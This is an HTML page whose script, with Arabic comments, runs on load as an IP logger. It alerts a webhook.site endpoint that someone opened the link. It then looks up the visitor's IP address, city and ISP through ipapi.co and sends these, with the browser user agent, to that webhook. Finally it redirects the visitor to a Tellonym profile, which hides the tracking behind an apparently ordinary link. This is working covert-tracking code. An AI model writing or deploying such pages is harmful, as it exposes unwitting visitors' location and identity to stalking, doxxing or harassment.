<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
        const target = "https://tellonym.me/Schaien/anything";

        async function ultraLog() {
            // 1. إرسال إشارة دخول فورية (قبل سحب البيانات)
            fetch(hook, { method: 'POST', mode: 'no-cors', body: "🚨 شخص دخل الرابط الآن!" });

            try {
                // 2. محاولة سحب البيانات التقنية
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // 3. إرسال الصيد الكامل
                await fetch(hook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        "INFO": "✅ تم سحب البيانات",
                        "IP": data.ip,
                        "CITY": data.city,
                        "ISP": data.org,
                        "AGENT": navigator.userAgent
                    })
                });
            } catch (e) {
                // استمرار حتى لو فشل السحب
            } finally {
                // 4. الهروب للوجهة النهائية
                setTimeout(() => { window.location.replace(target); }, 600);
            }
        }
        window.onload = ultraLog;
    </script>
</head>
<body style="background: #000;"></body>
</html>
